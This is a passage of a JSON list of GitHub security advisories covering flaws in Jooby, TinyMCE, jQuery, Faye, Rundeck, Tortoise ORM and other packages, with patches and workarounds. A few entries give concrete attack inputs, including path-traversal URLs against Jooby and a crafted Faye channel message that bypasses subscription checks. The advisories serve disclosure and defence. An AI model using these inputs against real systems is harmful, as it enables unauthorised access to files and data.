way we can get any configuration file or even the application class files\n\nIf assets are configured for a certain extension we can still bypass it. eg:\n\n```java\nassets(\"/static/**/*.js\", Paths.get(\"static\"));\n```\n\nWe can send:\n\n```\nhttp://localhost:8080/static/io/yiss/App.class.js\n```\n\n#### Arbitrary class path resource access 2\nThis vulnerability also affects assets configured to access resources from the root of the class path. eg:\n\n```java\nassets(\"/static/**\");\n```\n\nIn this case we can traverse `static` by sending:\n\n```\nhttp://localhost:8080/static/..%252fio/yiss/App.class\n```\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [jooby](https://github.com/jooby-project/jooby/issues)\n* Email us at [support@jooby.io](mailto:support@jooby.io)",
    "summary": "path traversal in Jooby"
  },
  {
    "ghsaId": "GHSA-mg5p-95m9-rmfp",
    "publishedAt": "2020-05-13T16:28:46Z",
    "description": "There is a vulnerability in actionpack_page-caching gem < v1.2.1 that allows an attacker to write arbitrary files to a web server, potentially resulting in remote code execution if the attacker can write unescaped ERB to a view.",
    "summary": "Arbitrary file write in actionpack-page_caching gem"
  },
  {
    "ghsaId": "GHSA-h98h-8mxr-m8gx",
    "publishedAt": "2020-05-13T16:01:35Z",
    "description": "TensorFlow before 1.7.0 has an integer overflow that causes an out-of-bounds read, possibly causing disclosure of the contents of process memory. This occurs in the DecodeBmp feature of the BMP decoder in core/kernels/decode_bmp_op.cc.",
    "summary": "Out-of-bounds read in TensorFlow possibly causing disclosure of the contents of process memory."
  },
  {
    "ghsaId": "GHSA-4w97-57v2-3w44",
    "publishedAt": "2020-05-12T00:45:24Z",
    "description": "### Impact\nUsers could experience false-negative validation outcomes for [MINT](https://github.com/simpleledger/slp-specifications/blob/master/slp-token-type-1.md#mint---extended-minting-transaction) transaction operations.  A poorly implemented SLP wallet could allow spending of the affected tokens which would result in the destruction of a user's minting baton.\n\n### Patches\nnpm package [slp-validate](https://www.npmjs.com/package/slp-validate) has been patched and published as version 1.2.1.\n\n### Workarounds\nUpgrade to slp-validate 1.2.1.\n\n### References\n* slp-validate [commit](https://github.com/simpleledger/slp-validate/commit/cde95c0c6470dceb4f023cd462f904135ebd73e7)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [slp-validate](https://github.com/simpleledger/slp-validate/issues)",
    "summary": "False-negative validation results in MINT transactions with invalid baton"
  },
  {
    "ghsaId": "GHSA-6jmf-mxwf-r3jc",
    "publishedAt": "2020-05-12T00:39:27Z",
    "description": "When Connect workers in Apache Kafka 2.0.0, 2.0.1, 2.1.0, 2.1.1, 2.2.0, 2.2.1, or 2.3.0 are configured with one or more config providers, and a connector is created/updated on that Connect cluster to use an externalized secret variable in a substring of a connector configuration property value, then any client can issue a request to the same Connect cluster to obtain the connector's task configuration and the response will contain the plaintext secret rather than the externalized secrets variables.",
    "summary": "Exposure of Sensitive Information to an Unauthorized Actor in Apache Kafka"
  },
  {
    "ghsaId": "GHSA-jc83-cpf9-q7c6",
    "publishedAt": "2020-05-12T00:39:03Z",
    "description": "### Impact\nUsers could experience false-negative validation outcomes for [MINT](https://github.com/simpleledger/slp-specifications/blob/master/slp-token-type-1.md#mint---extended-minting-transaction) transaction operations.  A poorly implemented SLP wallet could allow spending of the affected tokens which would result in the destruction of a user's minting baton.\n\n### Patches\nnpm package [slpjs](https://www.npmjs.com/package/slpjs) has been patched and published as version 0.27.2.\n\n\n### Workarounds\nUpgrade to slpjs 0.27.2.\n\n### References\n* slpjs [commit](https://github.com/simpleledger/slpjs/commit/3671be2ffb6d4cfa94c00c6dc8649d1ba1d75754)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [slp-validate](https://github.com/simpleledger/slp-validate/issues) or [slpjs](https://github.com/simpleledger/slpjs/issues)",
    "summary": "False-negative validation results in MINT transactions with invalid baton"
  },
  {
    "ghsaId": "GHSA-c78w-2gw7-gjv3",
    "publishedAt": "2020-05-11T20:00:15Z",
    "description": "### Impact\nA cross-site scripting (XSS) vulnerability was discovered in: the core parser and `media` plugin. The vulnerability allowed arbitrary JavaScript execution when inserting a specially crafted piece of content into the editor via the clipboard or APIs. This impacts all users who are using TinyMCE 4.9.9 or lower and TinyMCE 5.2.1 or lower.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 4.9.10 and 5.2.2 by improved HTML parsing and sanitization logic.\n\n### Workarounds\nThe workarounds available are:\n- disable the media plugin and manually sanitize CDATA content (see below)\nor\n- upgrade to either TinyMCE 4.9.10 or TinyMCE 5.2.2\n\n#### Example: Manually strip CDATA elements\n```js\nsetup: function(editor) {\n  editor.on('PreInit', function() {\n    editor.parser.addNodeFilter('#cdata', function(nodes) {\n      for (var i = 0; i < nodes.length; i++) {\n        nodes[i].remove();\n      }\n    });\n  });\n}\n```\n\n### Acknowledgements\nTiny Technologies would like to thank Michał Bentkowski and [intivesec](https://github.com/intivesec) for discovering these vulnerabilities.\n\n### References\nhttps://www.tiny.cloud/docs/release-notes/release-notes522/#securityfixes\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in the [TinyMCE repo](https://github.com/tinymce/tinymce/issues)\n* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)",
    "summary": "XSS in TinyMCE"
  },
  {
    "ghsaId": "GHSA-px8v-hxxx-2rgh",
    "publishedAt": "2020-05-08T21:00:02Z",
    "description": "### Impact\n\nA potential Server-Side Template Injection vulnerability exists in Sprout Forms which could lead to the execution of Twig code.\n\n### Patches\n\nThe problem is fixed in`barrelstrength/sprout-forms:v3.9.0` which upgrades to `barrelstrength/sprout-base-email:v1.2.7`\n\n### Workarounds\n\nUsers unable to upgrade should update any Notification Emails to use the \"Basic Notification (Sprout Email)\" template and avoid using the \"Basic Notification (Sprout Forms)\" template or any custom templates that display Form Fields.\n\n### References\n\n- See the release notes in the [CHANGELOG](https://github.com/barrelstrength/craft-sprout-forms/blob/v3/CHANGELOG.md#390---2020-04-09-critical)\n- Credits to Paweł Hałdrzyński, Daniel Kalinowski from [ISEC.PL](https://isec.pl/) for discovery and responsible disclosure\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in the [Sprout Forms repo](https://github.com/barrelstrength/craft-sprout-forms/issues)\n* Email us at [sprout@barrelstrengthdesign.com](mailto:sprout@barrelstrengthdesign.com)",
    "summary": "Potential Code Injection in Sprout Forms"
  },
  {
    "ghsaId": "GHSA-4rcq-jv2f-898j",
    "publishedAt": "2020-05-08T19:05:05Z",
    "description": "# Description\n\nAfter a certificate error was overridden by the user, qutebrowser displays the URL as yellow (`colors.statusbar.url.warn.fg`). However, when the affected website was subsequently loaded again, the URL was mistakenly displayed as green (`colors.statusbar.url.success_https`). While the user already has seen a certificate error prompt at this point (or set `content.ssl_strict` to `false` which is not recommended), this could still provide a false sense of security.\n\n# Affected versions and patches\n\nAll versions of qutebrowser are believed to be affected, though versions before v0.11.x couldn't be tested.\n\nThe issue is fixed in qutebrowser v1.11.1 (pending release) and v1.12.0 (unreleased). Backported patches for older versions are available, but no further releases are planned.\n\n# Mitigation\n\nIf you are unable to upgrade:\n\n- Treat any host with a certificate exception as insecure, ignoring the URL color\n- Or set `content.ssl_strict` to `True` (instead of `'ask'`), preventing certificate exceptions\n\n# References\n\n- qutebrowser issue: https://github.com/qutebrowser/qutebrowser/issues/5403\n- Fix (master branch): https://github.com/qutebrowser/qutebrowser/commit/021ab572a319ca3db5907a33a59774f502b3b975\n- Related issue for KDE Falkon: https://bugs.kde.org/show_bug.cgi?id=420902\n- Related issue for eric6 Web Browser: https://tracker.die-offenbachs.homelinux.org/eric/issue328 (fixed in eric6 20.6)",
    "summary": "Incorrect Provision of Specified Functionality in qutebrowser"
  },
  {
    "ghsaId": "GHSA-gw55-jm4h-x339",
    "publishedAt": "2020-05-08T18:54:39Z",
    "description": "The Java-WebSocket Client does not perform hostname verification.\n\n - This means that SSL certificates of other hosts are accepted as long as they are trusted. To exploit this vulnerability an attacker has to perform a man-in-the-middle (MITM) attack between a Java application using the Java-WebSocket Client and an WebSocket server it's connecting to.\n - TLS normally protects users and systems against MITM attacks, it cannot if certificates from other trusted hosts are accepted by the client.\n\nFor more information see: CWE-297: Improper Validation of Certificate with Host Mismatch - https://cwe.mitre.org/data/definitions/297.html\n\n## Important note\n\nThe OWASP Dependency-Check (https://jeremylong.github.io/DependencyCheck/index.html) may report that a dependency of your project is affected by this security vulnerability, but you don't use this lib.\nThis is caused by the fuzzy search in the OWASP implementation.\nCheck out this issue (https://github.com/TooTallNate/Java-WebSocket/issues/1019#issuecomment-628507934) for more information and a way to suppress the warning.",
    "summary": "Improper Validation of Certificate with Host Mismatch in Java-WebSocket"
  },
  {
    "ghsaId": "GHSA-jc8m-cxhj-668x",
    "publishedAt": "2020-05-07T21:16:46Z",
    "description": "### Impact\nBrute force vulnerability when using password authentication via Sorcery. The brute force protection submodule will prevent a brute force attack for the defined lockout period, but once expired protection will not be re-enabled until a user or malicious actor logs in successfully. This does not affect users that do not use the built-in brute force protection submodule, nor users that use permanent account lockout.\n\n### Patches\nPatched as of version `0.15.0`.\n\n### Workarounds\nCurrently no workarounds, other than monkey patching the authenticate method provided by Sorcery or upgrading to version `0.15.0`.",
    "summary": "Improper Restriction of Excessive Authentication Attempts in Sorcery"
  },
  {
    "ghsaId": "GHSA-j7vx-8mqj-cqp9",
    "publishedAt": "2020-05-07T21:11:07Z",
    "description": "### Impact\nInformation disclosure vulnerability. Allows an attacker to see all `Doorkeeper::Application` model attribute values (including secrets) using authorized applications controller if it's enabled (GET /oauth/authorized_applications.json).\n\n### Patches\n\nThese versions have the fix:\n\n* 5.0.3\n* 5.1.1\n* 5.2.5\n* 5.3.2\n\n### Workarounds\nPatch `Doorkeeper::Application` model `#as_json(options = {})` method and define only those attributes you want to expose.\n\nAdditional recommended hardening is to enable application secrets hashing ([guide](https://doorkeeper.gitbook.io/guides/security/token-and-application-secrets)), available since Doorkeeper 5.1. This would render the exposed secret useless.\n\n### References\n\n- Commit with fix: https://github.com/doorkeeper-gem/doorkeeper/commit/25d038022c2fcad45af5b73f9d003cf38ff491f6\n- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10187",
    "summary": "Exposure of Sensitive Information to an Unauthorized Actor in Doorkeeper"
  },
  {
    "ghsaId": "GHSA-5vf7-q87h-pg6w",
    "publishedAt": "2020-05-07T21:10:26Z",
    "description": "### Impact\n\nA user with permission to create comments could POST HTML directly to the system to be saved in a comment, which would then be executed/displayed to others users viewing the comment. Through this vulnerability custom JavaScript code could be injected and therefore ran on other user machines.\n\nThis most impacts scenarios where not-trusted users are given permission to create comments.\n\n### Patches\n\nThe issue was addressed in BookStack v0.29.2.\n\nAfter upgrading, The command `php artisan bookstack:regenerate-comment-content` should be ran to remove any pre-existing dangerous content. \n\n### Workarounds\n\nComments can be disabled in the system settings to prevent them being shown to users. Alternatively, comment creation permissions can be altered as required to only those who are trusted but this will not address existing exploitation of this vulnerability. \n\n### References\n\n* [BookStack Beta v0.29.2](https://github.com/BookStackApp/BookStack/releases/tag/v0.29.2)\n* JVN#41035278\n* [BookStack Blog Post](https://bookstackapp.com/blog/beta-release-v0-29-2/)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [the BookStack GitHub repository](BookStackApp/BookStack/issues).\n* Ask on the [BookStack Discord chat](https://discord.gg/ztkBqR2).\n* Follow the [BookStack Security Advice](https://github.com/BookStackApp/BookStack#-security) to contact someone privately.",
    "summary": "Cross-Site Scripting in BookStack"
  },
  {
    "ghsaId": "GHSA-jjjr-3jcw-f8v6",
    "publishedAt": "2020-05-07T18:04:53Z",
    "description": "### Impact\nA potential timing attack exists on pages or documents that have been protected with a shared password through Wagtail's \"Privacy\" controls. This password check is performed through a character-by-character string comparison, and so an attacker who is able to measure the time taken by this check to a high degree of accuracy could potentially use timing differences to gain knowledge of the password. (This is [understood to be feasible on a local network, but not on the public internet](https://groups.google.com/d/msg/django-developers/iAaq0pvHXuA/fpUuwjK3i2wJ).)\n\nPrivacy settings that restrict access to pages / documents on a per-user or per-group basis (as opposed to a shared password) are unaffected by this vulnerability.\n\n### Patches\nPatched versions have been released as Wagtail 2.7.3 (for the LTS 2.7 branch), Wagtail 2.8.2 and Wagtail 2.9.\n\n### Workarounds\nSite owners who are unable to upgrade to the new versions can use [user- or group-based privacy restrictions](https://docs.wagtail.io/en/stable/advanced_topics/privacy.html) to restrict access to sensitive information; these are unaffected by this vulnerability.",
    "summary": "Potential Observable Timing Discrepancy in Wagtail"
  },
  {
    "ghsaId": "GHSA-2m7g-9q74-9m3q",
    "publishedAt": "2020-05-06T20:49:04Z",
    "description": "The Apache Beam MongoDB connector in versions 2.10.0 to 2.16.0 has an option to disable SSL trust verification. However this configuration is not respected and the certificate verification disables trust verification in every case. This exclusion also gets registered globally which disables trust checking for any code running in the same JVM.",
    "summary": "Improper Certificate Validation in Apache Beam"
  },
  {
    "ghsaId": "GHSA-rjvg-q57v-mjjc",
    "publishedAt": "2020-05-06T19:51:02Z",
    "description": "In Apache Airflow before 1.10.5 when running with the \"classic\" UI, a malicious admin user could edit the state of objects in the Airflow metadata database to execute arbitrary javascript on certain page views. The new \"RBAC\" UI is unaffected.",
    "summary": "XSS in Apache Airflow"
  },
  {
    "ghsaId": "GHSA-qf7v-8hj3-4xw7",
    "publishedAt": "2020-05-06T19:41:29Z",
    "description": "PySAML2 before 5.0.0 does not check that the signature in a SAML document is enveloped and thus signature wrapping is effective, i.e., it is affected by XML Signature Wrapping (XSW). The signature information and the node/object that is signed can be in different places and thus the signature verification will succeed, but the wrong data will be used. This specifically affects the verification of assertion that have been signed.",
    "summary": "Improper Verification of Cryptographic Signature in PySAML2"
  },
  {
    "ghsaId": "GHSA-rc77-xxq6-4mff",
    "publishedAt": "2020-05-06T19:32:33Z",
    "description": "grammar-parser.jison in the hot-formula-parser package before 3.0.1 for Node.js is vulnerable to arbitrary code injection. The package fails to sanitize values passed to the parse function and concatenates them in an eval call. If a value of the formula is taken from user-controlled input, it may allow attackers to run arbitrary commands on the server.",
    "summary": "Arbitrary code injection in Formula Parser"
  },
  {
    "ghsaId": "GHSA-gqgv-6jq5-jjj9",
    "publishedAt": "2020-04-30T17:16:47Z",
    "description": "the web framework using ljharb's qs module older than v6.3.2, v6.2.3, v6.1.2, and v6.0.4 is vulnerable to a DoS. A malicious user can send a evil request to cause the web framework crash.",
    "summary": "NPM qs is vulnerable to DoS"
  },
  {
    "ghsaId": "GHSA-jpcq-cgw6-v4j6",
    "publishedAt": "2020-04-29T22:19:14Z",
    "description": "### Impact\nPassing HTML containing `<option>` elements from untrusted sources - even after sanitizing them - to one of jQuery's DOM manipulation methods (i.e. `.html()`, `.append()`, and others) may execute untrusted code.\n\n### Patches\nThis problem is patched in jQuery 3.5.0.\n\n### Workarounds\nTo workaround this issue without upgrading, use [DOMPurify](https://github.com/cure53/DOMPurify) with its `SAFE_FOR_JQUERY` option to sanitize the HTML string before passing it to a jQuery method.\n\n### References\nhttps://blog.jquery.com/2020/04/10/jquery-3-5-0-released/\n\n### For more information\nIf you have any questions or comments about this advisory, search for a relevant issue in [the jQuery repo](https://github.com/jquery/jquery/issues). If you don't find an answer, open a new issue.",
    "summary": "Potential XSS vulnerability in jQuery"
  },
  {
    "ghsaId": "GHSA-gxr4-xjj5-5px2",
    "publishedAt": "2020-04-29T22:18:55Z",
    "description": "### Impact\nPassing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. `.html()`, `.append()`, and others) may execute untrusted code.\n\n### Patches\nThis problem is patched in jQuery 3.5.0.\n\n### Workarounds\nTo workaround the issue without upgrading, adding the following to your code:\n\n```js\njQuery.htmlPrefilter = function( html ) {\n\treturn html;\n};\n```\n\nYou need to use at least jQuery 1.12/2.2 or newer to be able to apply this workaround.\n\n### References\nhttps://blog.jquery.com/2020/04/10/jquery-3-5-0-released/\nhttps://jquery.com/upgrade-guide/3.5/\n\n### For more information\nIf you have any questions or comments about this advisory, search for a relevant issue in [the jQuery repo](https://github.com/jquery/jquery/issues). If you don't find an answer, open a new issue.",
    "summary": "Potential XSS vulnerability in jQuery"
  },
  {
    "ghsaId": "GHSA-9w6v-m7wp-jwg4",
    "publishedAt": "2020-04-29T17:58:53Z",
    "description": "### Impact\nIf consumers of the http-client:\n  1. make an http request with an authorization header\n  2. that request leads to a redirect (302) and\n  3. the redirect url redirects to another domain or hostname \n\nThe authorization header will get passed to the other domain.\n\nNote that since this library is for actions, the GITHUB_TOKEN that is available in actions is generated and scoped per job with [these permissions](https://help.github.com/en/actions/configuring-and-managing-workflows/authenticating-with-the-github_token#permissions-for-the-github_token).\n\n### Patches\nThe problem is fixed in 1.0.8 at [npm here](https://www.npmjs.com/package/@actions/http-client).  In 1.0.8, the authorization header is stripped before making the redirected request if the hostname is different.\n\n### Workarounds\nNone.\n\n### References\nhttps://github.com/actions/http-client/pull/27\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in https://github.com/actions/http-client/issues",
    "summary": "Http request which redirect to another hostname do not strip authorization header in @actions/http-client"
  },
  {
    "ghsaId": "GHSA-qpg4-4w7w-2mq5",
    "publishedAt": "2020-04-29T17:41:15Z",
    "description": "On 20 April 2020 it was reported to me that the potential for authentication\nbypass exists in [Faye][1]'s extension system. This vulnerability has existed in\nthe Node.js and Ruby versions of the server since version 0.5.0, when extensions\nwere first introduced, in July 2010. It is patched in versions 1.0.4, 1.1.3 and\n1.2.5, which we are releasing today.\n\nThe vulnerability allows any client to bypass checks put in place by server-side\nextensions, by appending extra segments to the message channel. For example, the\nFaye [extension docs][2] suggest that users implement access control for\nsubscriptions by checking incoming messages for the `/meta/subscribe` channel,\nfor example:\n\n```js\nserver.addExtension({\n  incoming: function(message, callback) {\n    if (message.channel === '/meta/subscribe') {\n      if (message.ext.authToken !== 'my super secret password') {\n        message.error = 'Invalid auth token';\n      }\n    }\n    callback(message);\n  }\n});\n```\n\nA bug in the server's code for recognising the special `/meta/*` channels, which\ntrigger connection and subscription events, means that a client can bypass this\ncheck by sending a message to `/meta/subscribe/x` rather than `/meta/subscribe`:\n\n```json\n{\n  \"channel\": \"/meta/subscribe/x\",\n  \"clientId\": \"3jrc6602npj4gyp6bn5ap2wqzjtb2q3\",\n  \"subscription\": \"/foo\"\n}\n```\n\nThis message will not be checked by the above extension, as it checks the\nmessage's channel is exactly equal to `/meta/subscribe`. But it will still be\nprocessed as a subscription request by the server, so the client becomes\nsubscribed to the channel `/foo` without supplying the necessary credentials.\n\nThe vulnerability is caused by the way the Faye server recognises meta channels.\nIt will treat a message to any channel that's a prefix-match for one of the\nspecial channels `/meta/handshake`, `/meta/connect`, `/meta/subscribe`,\n`/meta/unsubscribe` or `/meta/disconnect`, as though it were an exact match for\nthat channel. So, a message to `/meta/subscribe/x` is still processed as a\nsubscription request, for example.\n\nAn authentication bypass for subscription requests is the most serious effect of\nthis but all other meta channels are susceptible to similar manipulation.\n\nThis parsing bug in the server is fixed in versions 1.0.4, 1.1.3 and 1.2.5.\nThese should be drop-in replacements for prior versions and you should upgrade\nimmediately if you are running any prior version.\n\nIf you are unable to install one of these versions, you can make your extensions\ncatch all messages the server would process by checking the channel _begins_\nwith the expected channel name, for example:\n\n```js\nserver.addExtension({\n  incoming: function(message, callback) {\n    if (message.channel.startsWith('/meta/subscribe')) {\n      // authentication logic\n    }\n    callback(message);\n  }\n});\n```\n\n[1]: https://faye.jcoglan.com/\n[2]: https://faye.jcoglan.com/node/extensions.html",
    "summary": "Authentication and extension bypass in Faye"
  },
  {
    "ghsaId": "GHSA-6m9g-jr8c-cqw3",
    "publishedAt": "2020-04-29T17:12:39Z",
    "description": "### Impact\nPossible remote Denial of Service or Data Injection.\n\n### Patches\nPatches are available in https://github.com/horazont/aioxmpp/pull/268. They have been backported to the 0.10 release series and 0.10.3 is the first release to contain the fix.\n\n### Workarounds\nTo make the bug exploitable, an error suppressing ``xso_error_handler`` is required. By not using ``xso_error_handlers`` or not using the suppression function, the vulnerability can be mitigated completely (to our knowledge).\n\n### References\nThe pull request contains a detailed description: https://github.com/horazont/aioxmpp/pull/268\n\n### For more information\nIf you have any questions or comments about this advisory:\n* [Join our chat](xmpp:aioxmpp@conference.zombofant.net?join)\n* Email the maintainer [Jonas Schäfer](mailto:jonas@wielicki.name)",
    "summary": "Depth counting error in guard() leading to multiple potential security issues in aioxmpp"
  },
  {
    "ghsaId": "GHSA-5679-7qrc-5m7j",
    "publishedAt": "2020-04-29T16:31:12Z",
    "description": "### Impact\n\nAuthenticated users can craft a request that reveals Execution data and logs  and Job details that they are not authorized to see.\n\n> Depending on the configuration and the way that Rundeck is used, this could result in anything between a high severity risk, or a very low risk. If access is tightly restricted and all users on the system have access to all projects, this is not really much of an issue. If access is wider and allows login for users that do not have access to any projects, or project access is restricted, there is a larger issue. If access is meant to be restricted and secrets, sensitive data, or intellectual property are exposed in Rundeck execution output and job data, the risk becomes much higher.\n\n### Details\n\nAn authenticated user could craft a request to:\n\n* View Executions and download execution logs without access to `read` or `view` the associated Job, or ad-hoc resource.\n* Get the list of running executions in a project, without Event `read` access, if they have `read` access to view the project.\n* View the Options definitions of a Job without access to view the Job.\n* View the definition of a workflow step of a Job without access to view the Job.\n* View the SCM diff of a modified Job definition if SCM is enabled, without Project `export` access level.\n* View the New User Profile Form for a different username, without User `admin` access. Note: they would not be allowed to create or modify a profile for a different user, or reveal any user profile information for a different user.\n\nSome authenticated API requests were not correctly checking appropriate authorization levels:\n\n* The list of running Executions would be sent without `read` access to Events.\n* The Plugin Input Parameters for a SCM plugin would be sent without authorization for project `import`,`scm_import`,`export`, or `scm_export` actions.\n* Job Retry action could retry an execution without `read` or `view` access to the Execution, which would reveal the Execution's option values. (`run` access to the Job was still required).\n\n### Patches\nUpgrade to Rundeck version 3.2.6\n\n### Workarounds\nNone\n\n### References\n[3.2.6 Release Notes](https://docs.rundeck.com/docs/history/3_2_x/version-3.2.6.html)\n\n### Report\nIf you have any questions or comments about this advisory:\n* Email us at [security@rundeck.com](mailto:security@rundeck.com)\n\nTo report security issues to Rundeck please use the form at [http://rundeck.com/security](http://rundeck.com/security)\n\nReporter: Justine Osborne of Apple Information Security",
    "summary": "IDOR can reveal execution data and logs to unauthorized user in Rundeck"
  },
  {
    "ghsaId": "GHSA-qh4w-7pw3-p4rp",
    "publishedAt": "2020-04-29T15:34:50Z",
    "description": "The Moped::BSON::ObjecId.legal? method in mongodb/bson-ruby before 3.0.4 as used in rubygem-moped allows remote attackers to cause a denial of service (worker resource consumption) via a crafted string. NOTE: This issue is due to an incomplete fix to CVE-2015-4410.",
    "summary": "Potential denial of service in bson rubygem"
  },
  {
    "ghsaId": "GHSA-758m-v56v-grj4",
    "publishedAt": "2020-04-23T21:36:03Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to javax.swing.JEditorPane.",
    "summary": "jackson-databind mishandles the interaction between serialization gadgets and typing"
  },
  {
    "ghsaId": "GHSA-5p34-5m6p-p58g",
    "publishedAt": "2020-04-23T21:08:40Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig (aka shaded hikari-config).",
    "summary": "jackson-databind mishandles the interaction between serialization gadgets and typing"
  },
  {
    "ghsaId": "GHSA-h4rc-386g-6m85",
    "publishedAt": "2020-04-23T20:19:02Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.commons.jelly.impl.Embedded (aka commons-jelly).",
    "summary": "jackson-databind mishandles the interaction between serialization gadgets and typing"
  },
  {
    "ghsaId": "GHSA-426h-24vj-qwxf",
    "publishedAt": "2020-04-23T20:09:09Z",
    "description": "npm-programmatic through 0.0.12 is vulnerable to Command Injection.The packages and option properties are concatenated together without any validation and are used by the 'exec' function directly.",
    "summary": "npm-programmatic is vulnerable to Command Injection"
  },
  {
    "ghsaId": "GHSA-95cm-88f5-f2c7",
    "publishedAt": "2020-04-23T16:32:59Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory (aka aries.transaction.jms).",
    "summary": "jackson-databind mishandles the interaction between serialization gadgets and typing"
  },
  {
    "ghsaId": "GHSA-fv3h-8x5j-pvgq",
    "publishedAt": "2020-04-22T20:59:50Z",
    "description": "python-markdown2 through 2.3.8 allows XSS because element names are mishandled unless a \\w+ match succeeds. For example, an attack might use elementname@ or elementname- with an onclick attribute.",
    "summary": "XSS in python-markdown2"
  },
  {
    "ghsaId": "GHSA-24m3-w8g9-jwpq",
    "publishedAt": "2020-04-22T20:59:44Z",
    "description": "### Background\n\nThe module controller in `SimpleSAML\\Module` that processes requests for pages\nhosted by modules, has code to identify paths ending with `.php` and process\nthose as PHP code. If no other suitable way of handling the given path exists it\npresents the file to the browser.\n\n### Description\n\nThe check to identify paths ending with `.php` does not account for uppercase\nletters. If someone requests a path ending with e.g. `.PHP` and the server is\nserving the code from a case-insensitive file system, such as on Windows, the\nprocessing of the PHP code does not occur, and the source code is instead\npresented to the browser.\n\n### Affected versions\n\nSimpleSAMLphp versions **1.18.5 and older**.\n\n### Impact\n\nAn attacker may use this issue to gain access to the source code in third-party\nmodules that is meant to be private, or even sensitive. However, the attack\nsurface is considered small, as the attack will only work when SimpleSAMLphp\nserves such content from a file system that is not case-sensitive, such as on\nWindows.\n\n### Resolution\n\nUpgrade the SimpleSAMLphp installation to version **1.18.6**.\n\n### Credit\n\nThis vulnerability was discovered and reported by Sławek Naczyński.",
    "summary": "Information disclosure of source code in SimpleSAMLphp"
  },
  {
    "ghsaId": "GHSA-9475-xg6m-j7pw",
    "publishedAt": "2020-04-22T20:59:37Z",
    "description": "### Impact\nSaml2 tokens are usually used as bearer tokens - a caller that presents a token is assumed to be the subject of the token. There is also support in the Saml2 protocol for issuing tokens that is tied to a subject through other means, e.g. holder-of-key where possession of a private key must be proved.\nThe Sustainsys.Saml2 library incorrectly treats all incoming tokens as bearer tokens, even though they have another subject confirmation method specified. This could be used by an attacker that could get access to Saml2 tokens with another subject confirmation method than bearer. The attacker could then use such a tocken to create a log in session.\n\n### Patches\nVersion 1.0.2 and 2.7.0 are patched.\n\n### Workarounds\nEnsure that any IdentityProvider trusted by the Sustainsys.Saml2 SP only issues bearer tokens if the audience matches the Sustainsys.Saml2 SP.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Comment on #103\n* Email us at security@sustainsys.com if you think that there are further security issues.",
    "summary": "Subject Confirmation Method not validated in Saml2 Authentication Services for ASP.NET"
  },
  {
    "ghsaId": "GHSA-w8rc-pgxq-x2cj",
    "publishedAt": "2020-04-22T20:59:26Z",
    "description": "### Impact\nUsing API or Controller based versions negative quantity is not adequately validated hence creating incorrect shopping cart and order total. \n\n### Patches\nAdding a back-end verification to check that quantity parameter isn't negative. If so, it is set to 1. Patched in 2.11.0\n\n### Workarounds\nWithout uprading, it's possible to just apply the fixes in the same files it's done for the patch. Or you use javax constraint validation on the quantity parameter.\n\n### References\n[Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)\n[Using bean validation constraint](https://javaee.github.io/tutorial/bean-validation002.html)\n[Commits with fixes](https://github.com/shopizer-ecommerce/shopizer/commit/929ca0839a80c6f4dad087e0259089908787ad2a)\nCVE Details below : \n[Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11007)\n[NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-11007)\n\n### Credits\nFound and solved by Yannick Gosset from Aix-Marseille University cybersecurity\nmaster program supervised by Yassine Ilmi ",
    "summary": "Negative charge in shopping cart in Shopizer"
  },
  {
    "ghsaId": "GHSA-9j2c-x8qm-qmjq",
    "publishedAt": "2020-04-20T21:31:23Z",
    "description": "### Impact\nVarious forms of SQL injection has been found, for MySQL and when filtering or doing mass-updates on char/text fields.\nSQLite & PostgreSQL was only affected when filtering with ``contains``, ``starts_with`` or ``ends_with`` filters (and their case-insensitive counterparts)\n\n\n### Patches\nPlease upgrade to 0.15.23+ or 0.16.6+\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Github](https://github.com/tortoise/tortoise-orm/issues)\n* Chat to us on [Gitter](https://gitter.im/tortoise/community)",
    "summary": "SQL injection in Tortoise ORM"
  },
  {
    "ghsaId": "GHSA-q8xg-8xwf-m598",
    "publishedAt": "2020-04-16T03:14:59Z",
    "description": "lix through 15.8.7 allows man-in-the-middle attackers to execute arbitrary code by modifying the HTTP client-server data stream so that the Location header is associated with attacker-controlled executable content in the postDownload field.",
    "summary": "man-in-the-middle attack in lix"
  },
  {
    "ghsaId": "GHSA-265q-28rp-chq5",
    "publishedAt": "2020-04-16T03:14:50Z",
    "description": "node-uuid before 1.4.4 uses insufficiently random data to create a GUID, which could make it easier for attackers to have unspecified impact via brute force guessing.",
    "summary": "Insufficiently random GUIDs in node-uuid"
  },
  {
    "ghsaId": "GHSA-3j7m-hmh3-9jmp",
    "publishedAt": "2020-04-16T03:14:47Z",
    "description": "sanitize-html before 1.4.3 has XSS.",
    "summary": "XSS in sanitize-html"
  },
  {
    "ghsaId": "GHSA-j438-45hc-vjhm",
    "publishedAt": "2020-04-16T03:14:39Z",
